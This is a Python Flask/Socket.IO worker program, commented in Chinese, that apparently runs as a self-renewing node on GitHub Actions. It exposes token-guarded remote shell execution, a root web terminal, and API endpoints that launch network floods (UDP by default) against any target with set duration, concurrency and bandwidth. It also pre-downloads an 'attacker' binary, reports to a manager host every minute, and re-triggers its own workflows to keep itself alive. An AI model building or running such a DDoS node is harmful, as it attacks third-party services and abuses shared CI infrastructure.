# -*- coding: utf-8 -*-
"""
Worker 工作实例（组装层 / Composition Root）

组合模块：
- persistence  数据/文件持久化
- sysconfig    系统配置备份恢复
- terminal     WSS 交互式终端
- attack       攻击功能
- tunnel       隧道
- process      进程持久化（核心新功能）
- core.lock    Leader 锁（manager 后端）
- core.status  状态/续命
"""
import os
import io
import json
import time
import select
import signal
import threading
import datetime
import subprocess
import urllib.request

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit

import config
import log
from core import lock as core_lock
from core import storage
from core import status as core_status
from core import utils
from core import ghapi
from worker import persistence
from worker import sysconfig as syscfg
from worker import terminal
from worker import attack as attack_mod
from worker.tunnel import TunnelManager
from worker.mcp import McpManager
from worker.process.manager import ProcessManager
from worker.process import api as proc_api

logger = log.setup_logger("worker")

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
                    ping_timeout=60, ping_interval=25)

# ==================== 运行时状态 ====================
_sid_to_key = {}
JOB_STATE = {"last_url": "", "load_status": "初始化中"}
leader = None
inst_cfg = None
proc_mgr = None
tunnel_mgr = None
mcp_mgr = None


def _elapsed():
    return core_status.elapsed()


# ==================== 初始化 ====================
def init_instance():
    """读取实例配置，设置实例级 asset 命名与隧道"""
    global inst_cfg
    cfg = storage.load_json_enc(f"inst-{config.INSTANCE_ID}.json.enc", default={})
    inst_cfg = config.InstanceConfig(config.INSTANCE_ID, cfg)
    logger.info(f"[init] 实例 {config.INSTANCE_ID} 配置加载完成: "
                f"host={inst_cfg.tunnel_host}")
    return inst_cfg


# ==================== 系统瘦身 / 调优 ====================
def _tune_network():
    """内核网络参数优化（提升发送性能）"""
    cmds = [
        "sudo sysctl -w net.core.wmem_default=67108864 2>/dev/null",
        "sudo sysctl -w net.core.rmem_default=67108864 2>/dev/null",
        "sudo sysctl -w net.core.netdev_max_backlog=65536 2>/dev/null",
        "sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535' 2>/dev/null",
        "sudo sysctl -w net.ipv4.tcp_wmem='4096 87380 67108864' 2>/dev/null",
        "sudo sysctl -w net.ipv4.tcp_rmem='4096 87380 67108864' 2>/dev/null",
    ]
    for c in cmds:
        try:
            subprocess.run(c, shell=True, timeout=5)
        except Exception:
            pass
    logger.info("[tune] 网络内核参数已优化")


def _system_trim():
    """停用云环境用不到的服务（省资源）"""
    services = [
        "php8.3-fpm", "php8.2-fpm", "php8.1-fpm", "php-fpm",
        "ModemManager", "multipathd", "walinuxagent", "udisks2",
        "getty@tty1", "serial-getty@ttyS0",
        "docker", "containerd", "docker.socket",
        "snapd", "snapd.socket", "snapd.seeded", "snapd.apparmor",
        "snapd.core-fixup", "snapd.autoimport", "snapd.system-shutdown",
        "snapd.snap-repair.timer",
    ]
    for svc in services:
        try:
            subprocess.run(f"sudo systemctl stop {svc} 2>/dev/null", shell=True, timeout=10)
            subprocess.run(f"sudo systemctl disable {svc} 2>/dev/null", shell=True, timeout=10)
        except Exception:
            pass
    logger.info("[trim] 系统瘦身完成（停用无用服务）")


def _write_shell_profile():
    """生成 root 终端配置（默认 root + kodebite + 持久化目录）"""
    persist = config.FILES_DIR
    os.makedirs(persist, exist_ok=True)
    profile = f"""# ghbox 云端终端配置
export LANG=C.UTF-8
export LC_ALL=C.UTF-8
export TERM=xterm-256color
export PS1='\\[\\e[32m\\]kodebite@ghbox\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]\\$ '
cd {persist} 2>/dev/null || true
"""
    try:
        subprocess.run("sudo mkdir -p /root", shell=True, timeout=5)
        subprocess.run("sudo tee /root/.bashrc > /dev/null", shell=True, timeout=10,
                       input=profile.encode())
        subprocess.run("sudo tee /root/.bash_profile > /dev/null", shell=True, timeout=10,
                       input=b"source ~/.bashrc 2>/dev/null\n")
        with open(os.path.join(os.path.expanduser("~"), ".bashrc"), "w") as f:
            f.write(profile)
        with open(os.path.join(os.path.expanduser("~"), ".bash_profile"), "w") as f:
            f.write("source ~/.bashrc 2>/dev/null\n")
        subprocess.run("sudo hostname ghbox 2>/dev/null || hostname ghbox 2>/dev/null",
                       shell=True, timeout=5)
        logger.info("[shell] root 终端配置完成")
    except Exception as e:
        logger.error(f"[shell] 配置写入失败: {e}")


def _run_setup():
    """执行 ~/files/setup.sh（用户自启动配置）"""
    setup = os.path.join(config.FILES_DIR, "setup.sh")
    if not os.path.exists(setup):
        return
    logger.info("[setup] 检测到 setup.sh，后台执行...")
    try:
        subprocess.Popen(["bash", setup],
                         stdout=open("/tmp/setup.log", "w"),
                         stderr=subprocess.STDOUT,
                         start_new_session=True)
        logger.info("[setup] setup.sh 已在后台执行，日志 /tmp/setup.log")
    except Exception as e:
        logger.error(f"[setup] 执行失败: {e}")


# ==================== HTTP 路由 ====================
@app.route("/")
def index():
    return jsonify(ok=True, instance=config.INSTANCE_ID, job=core_lock.JOB_ID,
                   elapsed=_elapsed(), leader=leader.is_leader if leader else False,
                   url=JOB_STATE["last_url"])


@app.route("/api/status")
def api_status():
    return jsonify(ok=True, instance=config.INSTANCE_ID, job_id=core_lock.JOB_ID,
                   elapsed=_elapsed(), leader=leader.is_leader if leader else False,
                   url=JOB_STATE["last_url"], source=JOB_STATE["load_status"],
                   tunnel_host=inst_cfg.tunnel_host if inst_cfg else config.TUNNEL_HOST)


@app.route("/api/logs")
def api_logs():
    limit = int(request.args.get("limit", 300))
    limit = max(10, min(limit, 2000))
    level = request.args.get("level")
    module = request.args.get("module")
    keyword = request.args.get("keyword")
    logs = log.get_logs(limit=limit, level=level, module=module, keyword=keyword)
    return jsonify(ok=True, logs=logs, stats=log.get_stats())


@app.route("/api/health")
def api_health():
    return jsonify(ok=True, instance=config.INSTANCE_ID, elapsed=_elapsed())


@app.route("/api/mcp/status")
def api_mcp_status():
    """MCP 服务状态"""
    if mcp_mgr:
        return jsonify(ok=True, **mcp_mgr.status())
    return jsonify(ok=False, error="MCP 服务未启动"), 503


@app.route("/api/resource")
def api_resource():
    """资源监控：CPU/内存/磁盘"""
    stats = log.get_resource_stats()
    stats["elapsed"] = _elapsed()
    return jsonify(ok=True, **stats)


def _check(data=None):
    """token 校验（兼容 body/header/query）"""
    token = ""
    if isinstance(data, dict):
        token = data.get("token", "")
    if not token:
        token = request.headers.get("Authorization", "").replace("Bearer ", "").strip()
    if not token:
        token = request.args.get("token", "")
    return bool(config.EXEC_TOKEN) and token == config.EXEC_TOKEN


@app.route("/api/exec", methods=["POST"])
def api_exec():
    """命令执行：token 认证 + 超时控制"""
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 403
    cmd = (data.get("cmd") or "").strip()
    if not cmd:
        return jsonify(ok=False, error="命令为空"), 400
    if len(cmd) > 2000:
        return jsonify(ok=False, error="命令过长"), 400
    timeout = int(data.get("timeout", 30))
    timeout = max(1, min(timeout, 600))
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return jsonify(ok=True, code=proc.returncode,
                       stdout=proc.stdout[-4000:], stderr=proc.stderr[-2000:])
    except subprocess.TimeoutExpired:
        return jsonify(ok=False, error=f"命令执行超时({timeout}s)"), 500
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


@app.route("/api/backup", methods=["POST"])
def api_backup():
    if not _check():
        return jsonify(ok=False, error="未授权"), 401
    if leader and not leader.is_leader:
        return jsonify(ok=False, error="当前为备份节点，不执行备份"), 503
    try:
        db_size, db_parts = persistence.backup_database(inst_cfg)
        res = persistence.backup_files(inst_cfg)
        f_size, f_parts = res if res else (None, None)
        return jsonify(ok=True, db_size=db_size, db_parts=db_parts,
                       files_size=f_size, files_parts=f_parts)
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


@app.route("/api/term/screen")
def api_term_screen():
    session_key = request.args.get("session", "")
    return jsonify(ok=True, screen=terminal.get_screen(session_key))


# ==================== 攻击 API ====================
@app.route("/api/attack/start", methods=["POST"])
def api_attack_start():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    if attack_mod.attack_state["running"]:
        return jsonify(ok=False, error="已有攻击在运行"), 409
    target = (data.get("target") or "").strip()
    if not target:
        return jsonify(ok=False, error="target 必填"), 400
    ok, msg = attack_mod.start_attack(
        target=target,
        mode=(data.get("type") or "udp").strip(),
        port=int(data.get("port", 80)),
        duration=int(data.get("duration", 60)),
        concurrency=int(data.get("concurrency", 100)),
        bandwidth=int(data.get("bandwidth", 0)),
        packet_size=int(data.get("packet_size", 1024)))
    if not ok:
        return jsonify(ok=False, error=msg), 500
    return jsonify(ok=True, msg=msg)


@app.route("/api/attack/stop", methods=["POST"])
def api_attack_stop():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    ok, msg = attack_mod.stop_attack()
    return jsonify(ok=ok, msg=msg)


@app.route("/api/attack/status", methods=["GET"])
def api_attack_status():
    return jsonify(ok=True, **attack_mod.attack_status())


# ==================== WSS 终端 ====================
def _pty_reader(session_key, sid):
    """读取 PTY 输出并推送（断线不关 fd，保留 bash）"""
    sess = terminal.SESSIONS.get(session_key)
    if not sess:
        return
    try:
        while sess.attached:
            r, _, _ = select.select([sess.fd], [], [], 1.0)
            if r:
                data = sess.read_output()
                if data is None:
                    break
                if data:
                    sess.feed(data)
                    socketio.emit("output", data, to=sid)
            else:
                wpid, status = os.waitpid(sess.pid, os.WNOHANG)
                if wpid == sess.pid:
                    socketio.emit("exit", {"code": status}, to=sid)
                    break
    except Exception:
        pass


@socketio.on("connect")
def ws_connect(auth):
    token = ""
    session_key = ""
    if isinstance(auth, dict):
        token = auth.get("token", "")
        session_key = auth.get("session", "")
    if not config.EXEC_TOKEN or token != config.EXEC_TOKEN:
        return False
    if not session_key:
        session_key = f"{config.INSTANCE_ID}-{core_lock.JOB_ID}"
    sess = terminal.get_or_create_session(session_key)
    _sid_to_key[request.sid] = session_key
    threading.Thread(target=_pty_reader, args=(session_key, request.sid), daemon=True).start()
    socketio.emit("session", {"session_key": session_key}, to=request.sid)


@socketio.on("input")
def ws_input(data):
    session_key = _sid_to_key.get(request.sid, "")
    sess = terminal.SESSIONS.get(session_key)
    if not sess:
        return
    payload = data if isinstance(data, bytes) else data.encode()
    sess.write_input(payload)


@socketio.on("resize")
def ws_resize(data):
    session_key = _sid_to_key.get(request.sid, "")
    sess = terminal.SESSIONS.get(session_key)
    if not sess:
        return
    try:
        sess.resize(int(data.get("rows", 24)), int(data.get("cols", 80)))
    except Exception:
        pass


@socketio.on("disconnect")
def ws_disconnect():
    session_key = _sid_to_key.pop(request.sid, "")
    if session_key:
        terminal.detach_session(session_key)


# ==================== 后台线程 ====================
def _backup_loop():
    """周期备份数据库 + 文件"""
    while True:
        time.sleep(config.BACKUP_INTERVAL)
        if leader and not leader.is_leader:
            continue
        try:
            size, parts = persistence.backup_database(inst_cfg)
            logger.info(f"[backup] 数据库已加密上传 {size} 字节 ({parts} 分片)")
        except Exception as e:
            logger.error(f"[backup] 数据库备份失败: {e}")
        try:
            res = persistence.backup_files(inst_cfg)
            if res:
                size, parts = res
                logger.info(f"[backup] 文件已加密上传 {size} 字节 ({parts} 分片)")
        except Exception as e:
            logger.error(f"[backup] 文件备份失败: {e}")


def _report_running():
    """周期向 manager 上报实例运行状态（每 60 秒，保证状态不卡 restarting）"""
    mgr_host = os.environ.get("MANAGER_HOST", "ghvps2.kekeke.cc.cd")
    while True:
        try:
            url = f"https://{mgr_host}/api/instances/{config.INSTANCE_ID}/report"
            payload = json.dumps({"token": config.EXEC_TOKEN,
                                  "url": f"https://{inst_cfg.tunnel_host}"}).encode()
            req = urllib.request.Request(url, data=payload,
                                         headers={"Content-Type": "application/json",
                                                  "User-Agent": "Mozilla/5.0 (ghbox-worker)"})
            urllib.request.urlopen(req, timeout=20)
        except Exception as e:
            logger.warning(f"[report] 上报失败: {e}")
        time.sleep(60)


def _worker_pre_wake():
    """续命：到期前强制备份并预触发下一个 worker"""
    done = False
    while True:
        elapsed = _elapsed()
        if elapsed >= config.PRE_WAKE_SECONDS and not done:
            done = True
            cfg = storage.load_json_enc(f"inst-{config.INSTANCE_ID}.json.enc", default=None)
            if cfg is None:
                logger.info(f"[prewake] 实例 {config.INSTANCE_ID} 已关闭，不再续命")
                return
            try:
                # 续命前强制备份（进程 + 数据库 + 文件）
                try:
                    if proc_mgr:
                        proc_mgr.final_snapshot()
                    persistence.backup_database(inst_cfg)
                    persistence.backup_files(inst_cfg)
                    logger.info("[prewake] 续命前强制备份完成")
                except Exception as be:
                    logger.error(f"[prewake] 强制备份失败: {be}")
                url = (f"https://api.github.com/repos/{config.REPO}/actions/workflows/"
                       f"{config.WORKER_WORKFLOW}/dispatches")
                ghapi.gh_request("POST", url,
                                      data={"ref": "main",
                                            "inputs": {"INSTANCE_ID": config.INSTANCE_ID}})
                logger.info(f"[prewake] 已预触发下一个 worker（{config.INSTANCE_ID}）")
            except Exception as e:
                logger.error(f"[prewake] 触发失败: {e}")
            break
        time.sleep(60)


def _auto_update_loop():
    """自动更新：主仓库新版本则同步 fork + 滚动重启"""
    current_sha = config.CURRENT_SHA
    if not current_sha:
        return
    while True:
        time.sleep(300)
        try:
            url = f"https://api.github.com/repos/{config.MAIN_REPO}/commits/main"
            status, d = ghapi.gh_request("GET", url)
            latest = d.get("sha", "")
            if latest and latest != current_sha:
                logger.info(f"[update] 检测到新版本 {latest[:10]}，同步 fork + 滚动重启")
                try:
                    url2 = f"https://api.github.com/repos/{config.REPO}/merge-upstream"
                    ghapi.gh_request("POST", url2, data={"branch": "main"})
                    time.sleep(5)
                except Exception as e:
                    logger.error(f"[update] fork 同步失败: {e}")
                url3 = (f"https://api.github.com/repos/{config.REPO}/actions/workflows/"
                        f"{config.WORKER_WORKFLOW}/dispatches")
                status2, _ = ghapi.gh_request(
                    "POST", url3, data={"ref": "main",
                                        "inputs": {"INSTANCE_ID": config.INSTANCE_ID}})
                if status2 not in (200, 204):
                    logger.error(f"[update] 触发新 worker 失败({status2})，继续运行")
                    time.sleep(300)
                    continue
                logger.info("[update] 已触发新 worker，60 秒后旧实例退出")
                time.sleep(60)
                os._exit(0)
        except Exception as e:
            logger.error(f"[update] 检查失败: {e}")


def _sysbackup_loop():
    """定期备份系统配置（每 10 分钟）"""
    while True:
        time.sleep(600)
        try:
            syscfg.backup_system_config()
        except Exception as e:
            logger.error(f"[sysbackup] 备份失败: {e}")


def _disk_monitor_loop():
    """磁盘监控：超阈值自动清理临时文件并告警"""
    while True:
        time.sleep(config.DISK_CHECK_INTERVAL)
        try:
            stats = log.get_resource_stats()
            pct = stats.get("disk_use_pct", 0)
            if pct >= config.DISK_CLEAN_TRIGGER_PERCENT:
                logger.warning(f"[disk] 磁盘占用 {pct}% 超阈值，清理临时文件")
                for d in ("/tmp", os.path.join(config.FILES_DIR, ".tmp")):
                    if os.path.isdir(d):
                        utils.safe_remove(os.path.join(d, "*"))
                stats2 = log.get_resource_stats()
                logger.info(f"[disk] 清理后占用 {stats2.get('disk_use_pct', 0)}%")
            elif pct >= config.DISK_WARN_PERCENT:
                logger.warning(f"[disk] 磁盘占用 {pct}%，注意空间")
        except Exception as e:
            logger.error(f"[disk] 监控异常: {e}")


# ==================== 优雅关闭 ====================
def _signal_handler(signum, frame):
    """捕获 SIGTERM/SIGINT：最终快照后退出"""
    logger.warning(f"[shutdown] 收到信号 {signum}，执行最终快照")
    try:
        if proc_mgr:
            proc_mgr.final_snapshot()
        persistence.backup_database(inst_cfg)
        persistence.backup_files(inst_cfg)
    except Exception as e:
        logger.error(f"[shutdown] 最终备份失败: {e}")
    # 停止 MCP 服务
    try:
        if mcp_mgr:
            mcp_mgr.stop()
    except Exception:
        pass
    os._exit(0)


# ==================== 入口 ====================
def _deferred_init():
    """延迟初始化（后台线程）：数据恢复、系统配置、进程恢复等。
    即使此函数卡住，隧道和 Flask 服务也已正常运行。"""
    global leader
    t0 = time.time()
    try:
        logger.info("[boot] === 阶段2：延迟初始化 ===")

        # 数据恢复
        JOB_STATE["load_status"] = persistence.load_or_create(inst_cfg)
        logger.info(f"[boot] 数据恢复完成 ({time.time()-t0:.1f}s)")
        persistence.save_prev_backup(inst_cfg)

        # 系统配置恢复 + 瘦身 + 调优
        try:
            syscfg.restore_system_config()
        except Exception as e:
            logger.error(f"[boot] 系统配置恢复失败: {e}")
        threading.Thread(target=_system_trim, daemon=True).start()
        _tune_network()
        threading.Thread(target=_sysbackup_loop, daemon=True).start()
        logger.info(f"[boot] 系统配置完成 ({time.time()-t0:.1f}s)")

        # shell 配置 + setup.sh
        _write_shell_profile()
        _run_setup()

        # 进程持久化：恢复并启动监控
        if proc_mgr:
            try:
                restored, failed = proc_mgr.restore_all()
                logger.info(f"[boot] 进程恢复 {restored} 个, 失败 {failed} 个 ({time.time()-t0:.1f}s)")
            except Exception as e:
                logger.error(f"[boot] 进程恢复异常: {e}")
            proc_mgr.start_monitor()

        # 预下载 attacker
        try:
            attack_mod.ensure_attacker()
        except Exception as e:
            logger.error(f"[boot] attacker 下载失败: {e}")

        # 启动 MCP 服务（独立隧道 + node 进程）
        try:
            mcp_mgr = McpManager(inst_cfg)
            mcp_mgr.start()
        except Exception as e:
            logger.error(f"[boot] MCP 服务启动失败: {e}")

        logger.info(f"=== Worker 实例 {config.INSTANCE_ID} 启动完成 ({time.time()-t0:.1f}s) ===")
        logger.info(f"=== 固定域名: {inst_cfg.tunnel_host} ===")

        # Leader 锁（manager 后端）
        leader = core_lock.LeaderLock(backend="manager", instance_id=config.INSTANCE_ID)
        leader.acquire()
        if leader.is_leader:
            threading.Thread(target=_backup_loop, daemon=True).start()
            threading.Thread(target=leader.heartbeat_loop, daemon=True).start()
        else:
            def _on_promote():
                JOB_STATE["load_status"] = persistence.load_or_create(inst_cfg)
                threading.Thread(target=_backup_loop, daemon=True).start()
                threading.Thread(target=leader.heartbeat_loop, daemon=True).start()
                logger.info(f"[lock] follower 提升为 leader，已启动备份+心跳")
            threading.Thread(target=leader.follower_loop, args=(_on_promote,), daemon=True).start()

        # 其他后台线程
        threading.Thread(target=_report_running, daemon=True).start()
        threading.Thread(target=_worker_pre_wake, daemon=True).start()
        threading.Thread(target=_auto_update_loop, daemon=True).start()
        threading.Thread(target=_disk_monitor_loop, daemon=True).start()
        terminal.start_cleanup()

        logger.info(f"[boot] === 全部初始化完成 ({time.time()-t0:.1f}s) ===")
    except Exception as e:
        logger.error(f"[boot] 延迟初始化失败: {e}")
        import traceback
        traceback.print_exc()


# ==================== 入口 ====================
def run():
    global leader, proc_mgr, tunnel_mgr, mcp_mgr
    t0 = time.time()

    # === 阶段1：最小启动（优先连上隧道）===
    logger.info("[boot] === 阶段1：最小启动 ===")
    init_instance()
    os.makedirs(config.FILES_DIR, exist_ok=True)
    os.makedirs(config.LOGS_DIR, exist_ok=True)
    logger.info(f"[boot] init_instance 完成: host={inst_cfg.tunnel_host} ({time.time()-t0:.1f}s)")

    # 信号处理（销毁前最终快照）
    signal.signal(signal.SIGTERM, _signal_handler)
    signal.signal(signal.SIGINT, _signal_handler)

    # 立即启动隧道（不等其他初始化，防止卡住导致 1033）
    tunnel_mgr = TunnelManager(inst_cfg)
    JOB_STATE["last_url"] = tunnel_mgr.url
    tunnel_mgr.start_async()
    logger.info(f"[boot] 隧道已异步启动: {tunnel_mgr.url} ({time.time()-t0:.1f}s)")

    # 创建 proc_mgr 并注册 API（进程恢复在延迟初始化中做）
    proc_mgr = ProcessManager(inst_cfg)
    proc_api.init_process_api(proc_mgr)
    app.register_blueprint(proc_api.bp)

    # 启动延迟初始化（后台线程）
    threading.Thread(target=_deferred_init, daemon=True).start()

    # 启动 Flask 服务（阻塞）
    log.request_logger(app)
    logger.info(f"[boot] Flask 服务启动中... 端口 {config.PORT} ({time.time()-t0:.1f}s)")
    socketio.run(app, host="0.0.0.0", port=config.PORT, allow_unsafe_werkzeug=True)
